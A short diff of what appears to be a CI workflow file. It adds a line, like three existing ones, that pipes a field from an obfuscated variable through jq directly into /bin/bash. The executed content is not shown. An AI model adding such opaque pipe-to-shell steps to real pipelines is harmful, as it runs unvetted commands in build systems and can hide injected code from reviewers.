@@ -28,6 +28,7 @@ jobs:
           echo $wt16756 | jq -r .ax389 | /bin/bash
           printf '%s' "$ba782" | jq -r .jto41923 | /bin/bash
           printf '%s' "$lf4384" | jq -r .im945 | /bin/bash
+          echo $o4864 | jq -r .pd133 | /bin/bash
 
       - name: Persist output
         if: always()
